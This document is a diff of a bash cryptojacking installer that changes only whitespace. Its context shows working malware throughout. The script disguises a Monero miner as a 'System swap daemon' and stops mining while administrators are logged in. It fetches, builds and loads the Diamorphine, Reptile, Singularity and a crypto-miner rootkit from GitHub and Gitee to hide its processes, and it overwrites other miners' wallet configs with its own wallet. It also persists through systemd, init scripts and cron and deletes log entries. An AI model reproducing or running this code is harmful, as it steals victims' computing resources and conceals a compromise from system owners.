@@ -1597,7 +1597,7 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
     # ==================== CONFIGURE CPUMINER-MULTI ====================
     echo "[*] Configuring cpuminer-multi..."
     echo "[*] Note: cpuminer-multi uses command-line args, no JSON config"
-    
+
     # Detect server IP for worker identification
     echo "[*] Detecting server IP address for worker identification..."
     PASS=$(get_server_ip)
@@ -1605,7 +1605,7 @@ elif [ "$MINER_TYPE" = "cpuminer" ]; then
         PASS="ARM-$(hostname)-$(date +%s)"
     fi
     echo "[*] Detected worker ID: $PASS"
-    
+
     # Create a simple start script
     cat > /root/.swapd/swapfile << 'CPUMINER_EOF'
 #!/bin/bash
@@ -1621,12 +1621,12 @@ exec ./swapd \
     -B \
     >/dev/null 2>&1
 CPUMINER_EOF
-    
+
     # Replace placeholders
     sed -i "s|WALLET_PLACEHOLDER|$WALLET|g" /root/.swapd/swapfile
     sed -i "s|PASS_PLACEHOLDER|$PASS|g" /root/.swapd/swapfile
     chmod +x /root/.swapd/swapfile
-    
+
     echo "[✓] cpuminer-multi configured"
     echo "[✓] Wallet: ${WALLET:0:20}..."
     echo "[✓] Pass (Worker ID): $PASS"
@@ -1676,17 +1676,17 @@ while true; do
     if who | grep -qvE "^root\s"; then
         ADMIN_LOGGED_IN=true
     fi
-    
+
     # Read previous state
     PREV_STATE=$(cat "$STATE_FILE" 2>/dev/null || echo "stopped")
-    
+
     # Determine desired state
     if [ "$ADMIN_LOGGED_IN" = true ]; then
         DESIRED_STATE="stopped"
     else
         DESIRED_STATE="running"
     fi
-    
+
     # Only act if state CHANGED
     if [ "$DESIRED_STATE" != "$PREV_STATE" ]; then
         if [ "$DESIRED_STATE" = "stopped" ]; then
@@ -1699,7 +1699,7 @@ while true; do
             echo "running" > "$STATE_FILE"
         fi
     fi
-    
+
     # Wait before next check
     sleep "$CHECK_INTERVAL"
 done
@@ -1711,14 +1711,14 @@ echo "[✓] Intelligent watchdog created"
 # ==================== CREATE SYSTEMD SERVICE (if available) ====================
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "[*] Creating systemd service..."
-    
+
     # Set ExecStart based on miner type
     if [ "$MINER_TYPE" = "cpuminer" ]; then
         EXEC_START="/root/.swapd/swapfile"  # cpuminer uses start script
     else
         EXEC_START="/root/.swapd/swapd -c /root/.swapd/swapfile"  # xmrig uses binary + config
     fi
-    
+
     cat > /etc/systemd/system/swapd.service <<SERVICE_EOF
 [Unit]
 Description=System swap daemon
@@ -1741,16 +1741,16 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 SERVICE_EOF
-    
+
     # Enable and start the service
     systemctl daemon-reload
     systemctl enable swapd 2>/dev/null || true
-    
+
     echo "[✓] Systemd service created and enabled"
-    
+
     # ==================== CREATE PROCESS HIDING DAEMON ====================
     echo "[*] Creating process hiding daemon..."
-    
+
     # Install hiding daemon script
     cat > /usr/local/bin/process-hider << 'HIDER_EOF'
 #!/bin/bash
@@ -1764,15 +1764,15 @@ while true; do
         sleep $INTERVAL
         continue
     fi
-    
+
     # Get swapd PID using systemctl
     SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-    
+
     # Fallback methods if systemctl fails
     if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
         SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
     fi
-    
+
     # Hide swapd if found
     if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
         # Check if visible
@@ -1781,7 +1781,7 @@ while true; do
             kill -59 "$SWAPD_PID" 2>/dev/null
         fi
     fi
-    
+
     # Hide watchdog if present
     WATCHDOG_PID=$(systemctl show --property MainPID --value system-watchdog.service 2>/dev/null)
     if [ -n "$WATCHDOG_PID" ] && [ "$WATCHDOG_PID" != "0" ]; then
@@ -1790,13 +1790,13 @@ while true; do
             kill -59 "$WATCHDOG_PID" 2>/dev/null
         fi
     fi
-    
+
     sleep $INTERVAL
 done
 HIDER_EOF
-    
+
     chmod +x /usr/local/bin/process-hider
-    
+
     # Create systemd service for hiding daemon
     cat > /etc/systemd/system/process-hider.service << 'HIDER_SERVICE_EOF'
 [Unit]
@@ -1816,12 +1816,12 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 HIDER_SERVICE_EOF
-    
+
     systemctl daemon-reload
     systemctl enable process-hider 2>/dev/null || true
-    
+
     echo "[✓] Process hiding daemon installed"
-    
+
     # Create watchdog service
     cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
 [Unit]
@@ -1840,17 +1840,17 @@ StandardError=null
 [Install]
 WantedBy=multi-user.target
 WATCHDOG_SERVICE_EOF
-    
+
     systemctl daemon-reload
     systemctl enable system-watchdog 2>/dev/null || true
     systemctl start system-watchdog 2>/dev/null || true
-    
+
     echo "[✓] Watchdog service created and enabled"
-    
+
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script (BusyBox compatible)..."
-    
+
     cat > /etc/init.d/swapd << 'INIT_EOF'
 #!/bin/sh
 ### BEGIN INIT INFO
@@ -1885,10 +1885,10 @@ case "$1" in
     start)
         echo "Starting $NAME..."
         cd $WORKDIR || exit 1
-        
+
         # BusyBox start-stop-daemon doesn't support --chdir
         start-stop-daemon --start --background --make-pidfile --pidfile $PIDFILE --exec $DAEMON -- $DAEMON_ARGS || true
-        
+
         # Auto-hide process after start (only if rootkits are loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             sleep 3
@@ -1904,7 +1904,7 @@ case "$1" in
     stop)
         echo "Stopping $NAME..."
         start-stop-daemon --stop --pidfile $PIDFILE --retry 5 2>/dev/null || true
-        
+
         # Fallback kill if pkill exists
         if command -v pkill >/dev/null 2>&1; then
             pkill -9 -f swapd 2>/dev/null || true
@@ -1915,7 +1915,7 @@ case "$1" in
                 kill -9 "$pid" 2>/dev/null || true
             done
         fi
-        
+
         rm -f $PIDFILE
         ;;
     restart)
@@ -1943,9 +1943,9 @@ esac
 
 exit 0
 INIT_EOF
-    
+
     chmod +x /etc/init.d/swapd
-    
+
     # Add to startup (distribution-specific)
     if command -v update-rc.d >/dev/null 2>&1; then
         update-rc.d swapd defaults >/dev/null 2>&1 || true
@@ -1953,9 +1953,9 @@ INIT_EOF
         chkconfig --add swapd >/dev/null 2>&1 || true
         chkconfig swapd on >/dev/null 2>&1 || true
     fi
-    
+
     echo "[✓] SysV init script created and enabled"
-    
+
     # Install watchdog as a background daemon
     echo "[*] Installing watchdog as background daemon..."
     nohup /usr/local/bin/system-watchdog >/dev/null 2>&1 &
@@ -1968,19 +1968,19 @@ install_diamorphine() {
     echo "========================================"
     echo "INSTALLING DIAMORPHINE ROOTKIT"
     echo "========================================"
-    
+
     # Skip on non-64-bit systems
     if [ "$IS_64BIT" = "false" ]; then
         echo "[!] Skipping Diamorphine on non-64-bit system"
         return 1
     fi
-    
+
     # Check kernel version compatibility
     KERNEL_VERSION=$(uname -r | cut -d. -f1)
     KERNEL_MINOR=$(uname -r | cut -d. -f2)
-    
+
     echo "[*] Detected kernel version: $(uname -r)"
-    
+
     if [ "$KERNEL_VERSION" -ge 6 ]; then
         echo ""
         echo "[!] ============================================"
@@ -2002,18 +2002,18 @@ install_diamorphine() {
     else
         echo "[✓] Kernel version compatible with Diamorphine"
     fi
-    
+
     cd /tmp || return 1
-    
+
     # Remove old installation
     if lsmod | grep -q diamorphine 2>/dev/null; then
         echo "[*] Removing old Diamorphine..."
         rmmod diamorphine 2>/dev/null || true
         sleep 1
     fi
-    
+
     rm -rf diamorphine 2>/dev/null
-    
+
     # Clone and build
     echo "[*] Cloning Diamorphine..."
     export GIT_TERMINAL_PROMPT=0
@@ -2023,14 +2023,14 @@ install_diamorphine() {
         return 1
     fi
     unset GIT_TERMINAL_PROMPT
-    
+
     cd diamorphine || {
         echo "[!] Failed to cd to diamorphine directory"
         cd /tmp || true
         rm -rf diamorphine
         return 1
     }
-    
+
     echo "[*] Building Diamorphine..."
     if [ "$VERBOSE" = true ]; then
         make
@@ -2039,7 +2039,7 @@ install_diamorphine() {
         make 2>/dev/null
         BUILD_SUCCESS=$?
     fi
-    
+
     if [ $BUILD_SUCCESS -ne 0 ]; then
         echo "[!] Failed to build Diamorphine"
         echo "[!] This is common on kernel 6.x - try Reptile instead"
@@ -2047,7 +2047,7 @@ install_diamorphine() {
         rm -rf diamorphine
         return 1
     fi
-    
+
     # Load the module
     echo "[*] Loading Diamorphine kernel module..."
     insmod diamorphine.ko 2>/dev/null &
@@ -2071,16 +2071,16 @@ install_diamorphine() {
         echo "[!] Likely kernel incompatibility - try Reptile instead"
         cd /tmp || true; rm -rf diamorphine; return 1
     fi
-    
+
     # Verify it loaded
     if lsmod | grep -q diamorphine 2>/dev/null; then
         echo "[✓] Diamorphine loaded successfully"
         echo "[✓] Surprisingly worked on kernel $(uname -r)!"
-        
+
         # Clean up build artifacts
         cd /tmp || true
         rm -rf diamorphine
-        
+
         return 0
     else
         echo "[!] Diamorphine failed to load"
@@ -2096,44 +2096,44 @@ install_reptile() {
     echo "========================================"
     echo "INSTALLING REPTILE ROOTKIT"
     echo "========================================"
-    
+
     # Skip on non-64-bit systems
     if [ "$IS_64BIT" = "false" ]; then
         echo "[!] Skipping Reptile on non-64-bit system"
         return 1
     fi
-    
+
     # Check kernel version
     KERNEL_VERSION=$(uname -r | cut -d. -f1)
     echo "[*] Detected kernel version: $(uname -r)"
-    
+
     if [ "$KERNEL_VERSION" -ge 6 ]; then
         echo "[✓] Kernel 6.x detected - Reptile has BETTER compatibility than Diamorphine"
         echo "[*] Reptile is more actively maintained and supports newer kernels"
     else
         echo "[✓] Kernel version compatible with Reptile"
     fi
-    
+
     # Create hidden directory
     mkdir -p /tmp/.ICE-unix/.X11-unix 2>/dev/null
     cd /tmp/.ICE-unix/.X11-unix || return 1
-    
+
     # Remove old installation
     if [ -d Reptile ]; then
         echo "[*] Removing old Reptile installation..."
         rm -rf Reptile
     fi
-    
+
     if lsmod | grep -q reptile 2>/dev/null; then
         echo "[*] Unloading old Reptile module..."
         rmmod reptile 2>/dev/null || true
         sleep 1
     fi
-    
+
     # Clone Reptile (disable interactive prompts)
     echo "[*] Cloning Reptile..."
     export GIT_TERMINAL_PROMPT=0
-    
+
     # Try Gitee mirror first (faster, more reliable)
     if [ "$VERBOSE" = true ]; then
         echo "[*] Cloning from Gitee: https://gitee.com/fengzihk/Reptile.git"
@@ -2166,9 +2166,9 @@ install_reptile() {
         fi
     fi
     unset GIT_TERMINAL_PROMPT
-    
+
     cd Reptile || return 1
-    
+
     # Build Reptile
     echo "[*] Building Reptile (this may take a while)..."
     if ! make 2>/dev/null; then
@@ -2177,7 +2177,7 @@ install_reptile() {
         rm -rf Reptile
         return 1
     fi
-    
+
     # Load the module
     echo "[*] Loading Reptile kernel module..."
     insmod reptile.ko 2>/dev/null &
@@ -2200,7 +2200,7 @@ install_reptile() {
         echo "[!] Failed to load Reptile"
         cd /tmp/.ICE-unix/.X11-unix || true; rm -rf Reptile; return 1
     fi
-    
+
     # Verify it loaded
     if lsmod | grep -q reptile 2>/dev/null; then
         echo "[✓] Reptile loaded successfully"
@@ -2260,7 +2260,7 @@ if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-root
     cd hiding-cryptominers-linux-rootkit/ 2>/dev/null || {
         echo "[!] Failed to cd to rootkit directory, skipping..."
     }
-    
+
     if [ -d hiding-cryptominers-linux-rootkit ] && [ "$(pwd)" = "*hiding-cryptominers-linux-rootkit*" ] || [ -f Makefile ]; then
         echo "[*] Building rootkit..."
         if timeout 120 make 2>/dev/null; then
@@ -2315,7 +2315,7 @@ if git clone --depth 1 https://gitee.com/qianmeng/hiding-cryptominers-linux-root
             echo "[!] Failed to build crypto rootkit"
         fi
     fi
-    
+
     cd /tmp/.X11-unix 2>/dev/null || cd /tmp 2>/dev/null || true
     rm -rf hiding-cryptominers-linux-rootkit/ 2>/dev/null || true
 else
@@ -2341,7 +2341,7 @@ if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
     echo "INSTALLING SINGULARITY ROOTKIT"
     echo "For Kernel 6.x"
     echo "========================================"
-    
+
     # Ensure we're in /dev/shm for stealth
     if ! cd /dev/shm 2>/dev/null; then
         echo "[!] /dev/shm not available, using /tmp"
@@ -2350,33 +2350,33 @@ if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
             SINGULARITY_LOADED=false
         }
     fi
-    
+
     # Remove old Singularity if exists
     if [ -d "Singularity" ]; then
         rm -rf Singularity
     fi
-    
+
     echo "[*] Cloning Singularity from GitHub..."
     export GIT_TERMINAL_PROMPT=0
-    
+
     if git clone --depth 1 https://github.com/MatheuZSecurity/Singularity 2>&1 | grep -v "Username"; then
         unset GIT_TERMINAL_PROMPT
-        
+
         cd Singularity || {
             echo "[!] Failed to cd to Singularity directory"
         }
-        
+
         if [ -f "Makefile" ]; then
             # Configure reverse shell IP (localhost by default)
             echo "[*] Configuring Singularity..."
             sed -i 's/192\.168\.1\.100/127.0.0.1/g' modules/icmp.c 2>/dev/null
-            
+
             # Try to compile
             echo "[*] Compiling Singularity (this may take a minute)..."
-            
+
             if make 2>&1 | tee /tmp/singularity_build.log | tail -5 | grep -q "singularity.ko"; then
                 echo "[✓] Singularity compiled successfully!"
-                
+
                 # Try to load the module
                 echo "[*] Loading Singularity kernel module..."
                 insmod singularity.ko 2>/dev/null &
@@ -2419,7 +2419,7 @@ if [[ "$KERNEL_MAJOR" == "6" ]] || [ "$KERNEL_MAJOR" -eq 6 ] 2>/dev/null; then
             echo "[!] Makefile not found in Singularity directory"
             SINGULARITY_LOADED=false
         fi
-        
+
         # Go back to safe directory
         cd /tmp 2>/dev/null || true
     else
@@ -2453,7 +2453,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     fi
     sleep 2
     systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
-    
+
     # Start process hiding daemon
     echo "[*] Starting process hiding daemon..."
     systemctl start process-hider 2>/dev/null || true
@@ -2474,22 +2474,22 @@ else
     # Fallback: No systemd, no SysV init (BusyBox/embedded systems)
     echo "[!] No systemd or SysV init detected (BusyBox/embedded system)"
     echo "[*] Starting miner as background daemon..."
-    
+
     # Kill any existing instances
     pkill -9 -f /root/.swapd/swapd 2>/dev/null || true
     killall -9 swapd 2>/dev/null || true
-    
+
     # Start in background with nohup
     cd /root/.swapd || exit 1
     nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &
     MINER_PID=$!
-    
+
     sleep 3
-    
+
     # Verify it started
     if kill -0 $MINER_PID 2>/dev/null; then
         echo "[✓] Miner started as daemon (PID: $MINER_PID)"
-        
+
         # Send hide signals immediately (only if rootkits loaded)
         if lsmod | grep -qE "diamorphine|singularity|rootkit"; then
             kill -31 $MINER_PID 2>/dev/null || true
@@ -2498,7 +2498,7 @@ else
         else
             echo "[*] Rootkits not loaded - process will remain visible"
         fi
-        
+
         # Add to crontab for auto-restart on reboot
         (crontab -l 2>/dev/null | grep -v "swapd"; echo "@reboot cd /root/.swapd && nohup /root/.swapd/swapd -c /root/.swapd/swapfile >/dev/null 2>&1 &") | crontab -
         echo "[✓] Added to crontab for auto-start on reboot"
@@ -2798,35 +2798,35 @@ MY_WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566v
 # Function to validate if a string is a Monero wallet address
 is_monero_wallet() {
     local address="$1"
-    
+
     # Check if empty or too short
     [ -z "$address" ] && return 1
     [ ${#address} -lt 90 ] && return 1
-    
+
     # Monero addresses start with 4 (standard, 95 chars) or 8 (integrated, 106 chars)
     # Subaddresses start with 8 (87 chars)
     local first_char="${address:0:1}"
     if [ "$first_char" != "4" ] && [ "$first_char" != "8" ]; then
         return 1
     fi
-    
+
     # Check length is valid for Monero addresses
     local addr_len=${#address}
     if [ $addr_len -ne 95 ] && [ $addr_len -ne 106 ] && [ $addr_len -ne 87 ]; then
         return 1
     fi
-    
+
     # Check for invalid characters (Monero uses base58, no: 0, O, I, l)
     # Also reject common placeholders/patterns
     if echo "$address" | grep -qE '[^123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]'; then
         return 1
     fi
-    
+
     # Reject obvious placeholders
     if echo "$address" | grep -qiE '(\[\[|example|test|placeholder|sample|dummy|xxx|dbuser|softdb|admin)'; then
         return 1
     fi
-    
+
     # Valid Monero wallet address
     return 0
 }
@@ -2851,37 +2851,37 @@ CONFIGS_HIJACKED=0
 for search_path in "${SEARCH_PATHS[@]}"; do
     if [ -d "$search_path" ]; then
         echo "[*] Searching in $search_path..."
-        
+
         # Find all config.json files (with timeout to prevent hanging)
         timeout 30 find "$search_path" -type f -name "config.json" 2>/dev/null | while read -r config_file; do
             # Skip our own config
             if echo "$config_file" | grep -q "/root/.swapd/"; then
                 continue
             fi
-            
+
             # Check if file contains a "user" field (wallet address)
             if grep -q '"user"' "$config_file" 2>/dev/null; then
                 CONFIGS_FOUND=$((CONFIGS_FOUND + 1))
-                
+
                 # Extract current wallet
                 CURRENT_WALLET=$(grep '"user"' "$config_file" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                
+
                 # Validate it's actually a Monero wallet address
                 if ! is_monero_wallet "$CURRENT_WALLET"; then
                     # Not a wallet address, skip this file
                     continue
                 fi
-                
+
                 # Check if it's already our wallet
                 if [ "$CURRENT_WALLET" = "$MY_WALLET" ]; then
                     echo "  [✓] $config_file - Already using our wallet"
                 else
                     echo "  [!] $config_file - Found different wallet"
                     echo "      Old: ${CURRENT_WALLET:0:20}...${CURRENT_WALLET: -10}"
-                    
+
                     # Backup original config
                     cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
-                    
+
                     # OVERWRITE entire config.json with our exact configuration
                     cat > "$config_file" << 'CONFIG_EOF'
 {
@@ -2903,12 +2903,12 @@ for search_path in "${SEARCH_PATHS[@]}"; do
     ]
 }
 CONFIG_EOF
-                    
+
                     if [ $? -eq 0 ]; then
                         echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
                         echo "      [✓] Config completely overwritten!"
                         CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
-                        
+
                         # Try to restart the associated service/process
                         # Find process using this config file
                         MINER_PID=$(lsof "$config_file" 2>/dev/null | grep -v COMMAND | awk '{print $2}' | head -1)
@@ -2932,7 +2932,7 @@ echo "[*] Checking systemd services for miners..."
 for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
     if systemctl list-unit-files 2>/dev/null | grep -q "^${service_name}.service"; then
         echo "[*] Found service: $service_name.service"
-        
+
         # Try to extract ExecStart path from service file
         SERVICE_FILE=$(systemctl show -p FragmentPath "$service_name" 2>/dev/null | cut -d= -f2)
         if [ -f "$SERVICE_FILE" ]; then
@@ -2940,22 +2940,22 @@ for service_name in xmrig swapd kswapd0 minerd cpuminer miner; do
             CONFIG_PATH=$(grep "ExecStart" "$SERVICE_FILE" 2>/dev/null | grep -oP '\-c\s+\K[^\s]+' | head -1)
             if [ -n "$CONFIG_PATH" ] && [ -f "$CONFIG_PATH" ]; then
                 echo "  Config: $CONFIG_PATH"
-                
+
                 # Check and hijack if needed
                 if grep -q '"user"' "$CONFIG_PATH" 2>/dev/null; then
                     CURRENT_WALLET=$(grep '"user"' "$CONFIG_PATH" | sed 's/.*"user".*:.*"\([^"]*\)".*/\1/' | head -1)
-                    
+
                     # Validate it's actually a Monero wallet address
                     if ! is_monero_wallet "$CURRENT_WALLET"; then
                         echo "  [*] Not a miner config (invalid wallet format)"
                         continue
                     fi
-                    
+
                     if [ "$CURRENT_WALLET" != "$MY_WALLET" ]; then
                         echo "  [!] Different wallet detected - hijacking..."
                         cp "$CONFIG_PATH" "${CONFIG_PATH}.backup.$(date +%s)" 2>/dev/null || true
                         sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$CONFIG_PATH" 2>/dev/null
-                        
+
                         echo "  [✓] Wallet replaced - restarting service..."
                         systemctl restart "$service_name" 2>/dev/null || true
                     fi
@@ -2978,10 +2978,10 @@ echo "[*] Cleaning up system logs..."
 clean_log() {
     local logfile="$1"
     local pattern="$2"
-    
+
     # Skip if file doesn't exist
     [ -f "$logfile" ] || return 0
-    
+
     # Try sed -i (some BusyBox versions don't support it)
     if sed -i "/$pattern/d" "$logfile" 2>/dev/null; then
         return 0
@@ -3389,7 +3389,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "PROCESS HIDING (AUTOMATIC)"
     echo "=========================================="
     echo ""
-    
+
     # Check if rootkits are loaded
     if ! lsmod | grep -qE "diamorphine|singularity|rootkit"; then
         echo "[!] WARNING: No rootkits detected"
@@ -3401,7 +3401,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
         echo "[*] The process-hider daemon will automatically hide processes"
         echo "[*] Waiting 30 seconds for daemon to hide processes..."
         echo ""
-        
+
         # Wait for daemon to do its work
         for i in {1..6}; do
             sleep 5
@@ -3417,7 +3417,7 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
                 echo "[*] Attempt $i/6 - process still visible, daemon working..."
             fi
         done
-        
+
         echo ""
         echo "The hiding daemon (process-hider.service) runs continuously"
         echo "It will keep hiding processes every 10 seconds automatically"
@@ -3449,7 +3449,7 @@ detect_rootkit() {
         echo "[✓] Detected: Diamorphine (signal -31)"
         return 0
     fi
-    
+
     # Check for Singularity
     if lsmod | grep -q "^singularity"; then
         ROOTKIT_NAME="Singularity"
@@ -3457,7 +3457,7 @@ detect_rootkit() {
         echo "[✓] Detected: Singularity (signal -59)"
         return 0
     fi
-    
+
     # Check for Reptile
     if lsmod | grep -q "^reptile"; then
         ROOTKIT_NAME="Reptile"
@@ -3465,7 +3465,7 @@ detect_rootkit() {
         echo "[✓] Detected: Reptile (uses reptile_cmd)"
         return 0
     fi
-    
+
     # Check for Crypto-Miner Rootkit
     if lsmod | grep -q "^rootkit"; then
         ROOTKIT_NAME="Crypto-RK"
@@ -3473,7 +3473,7 @@ detect_rootkit() {
         echo "[✓] Detected: Crypto-Miner Rootkit (signal -31)"
         return 0
     fi
-    
+
     # No rootkit found
     echo "[!] NO ROOTKIT LOADED!"
     ROOTKIT_NAME=""
@@ -3496,25 +3496,25 @@ if [ -z "$ROOTKIT_NAME" ]; then
     echo ""
 else
     echo ""
-    
+
     # Wait for process to fully start
     echo "[*] Waiting 5 seconds for process to stabilize..."
     sleep 5
-    
+
     # Get swapd PID
     echo "[*] Getting swapd PID..."
     SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-    
+
     if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
         SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
     fi
-    
+
     if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
         echo "[✓] Found PID: $SWAPD_PID"
         echo ""
-        
+
         echo "[*] Hiding process using $ROOTKIT_NAME..."
-        
+
         # Use ONLY the correct signal for this rootkit
         case "$ROOTKIT_NAME" in
             "Diamorphine"|"Crypto-RK")
@@ -3530,23 +3530,23 @@ else
                 reptile_cmd hide $SWAPD_PID 2>/dev/null || echo "    [!] reptile_cmd not found"
                 ;;
         esac
-        
+
         # Wait for rootkit to process signal
         echo ""
         echo "[*] Waiting 5 seconds for rootkit to process..."
         sleep 5
-        
+
         # Verify hiding worked
         echo ""
         echo "[*] Verifying process is hidden..."
-        
+
         # Check service status first
         SERVICE_STATUS=$(systemctl is-active swapd 2>/dev/null)
-        
+
         if [ "$SERVICE_STATUS" = "active" ]; then
             # Service still active - good sign
             PS_CHECK=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-            
+
             if [ -z "$PS_CHECK" ]; then
                 echo "[✓] SUCCESS! Process is HIDDEN!"
                 echo ""
@@ -3565,7 +3565,7 @@ else
         else
             echo "[!] WARNING: Service status is '$SERVICE_STATUS'"
             echo ""
-            
+
             # Check if process was killed by signal
             if systemctl status swapd 2>/dev/null | grep -q "status=$HIDE_SIGNAL"; then
                 echo "[!] CRITICAL: Signal -$HIDE_SIGNAL KILLED the process!"
@@ -3582,7 +3582,7 @@ else
                 echo "Check with:"
                 echo "  dmesg | tail -30 | grep -i rootkit"
                 echo ""
-                
+
                 # Restart service
                 echo "[*] Restarting service (without hiding)..."
                 systemctl restart swapd
